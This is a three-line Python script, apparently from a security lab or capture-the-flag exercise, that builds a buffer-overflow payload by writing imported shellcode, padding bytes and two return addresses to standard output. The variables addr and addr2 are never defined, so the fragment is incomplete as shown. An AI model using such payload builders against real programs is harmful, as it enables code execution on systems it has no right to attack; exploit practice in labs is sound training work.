
import sys
from shellcode import shellcode
sys.stdout.buffer.write(shellcode + b"A"*3 + addr + addr2)
